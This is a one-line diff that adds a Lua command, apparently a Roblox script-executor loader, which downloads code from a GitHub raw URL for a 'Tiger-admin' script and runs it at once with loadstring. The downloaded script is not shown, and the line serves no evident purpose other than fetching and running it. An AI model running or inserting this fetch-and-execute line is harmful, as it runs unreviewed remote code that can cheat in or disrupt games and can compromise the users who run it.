@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SilverShard497/Tiger-admin/refs/heads/main/Any"))()
